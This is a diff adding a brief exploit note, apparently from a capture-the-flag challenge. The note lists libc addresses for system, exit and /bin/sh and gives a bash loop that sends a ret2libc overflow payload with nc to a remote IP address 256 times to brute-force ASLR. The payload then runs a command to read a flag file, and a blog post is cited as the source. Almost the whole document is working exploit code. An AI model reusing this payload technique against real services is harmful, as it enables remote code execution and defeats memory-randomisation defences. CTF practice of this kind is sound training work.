@@ -1,0 +1,13 @@
+
+address of:
+ system   : 0xf7e19830
+ exit     : 0xf7e0c170
+ /bin/sh  : 0xf7f66352
+ /bin/bash: 0xffffd73a
+
+brute force ASLR with:
+for i in {1..256}; do nc 20.94.210.205 1338 < <(echo -e 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa0\x98\xe1\xf7p\xc1\xe0\xf7Rc\xf6\xf7\ncat flag2.txt'); done
+
+source:
+https://www.ret2rop.com/2018/08/can-we-bruteforce-aslr.html
+
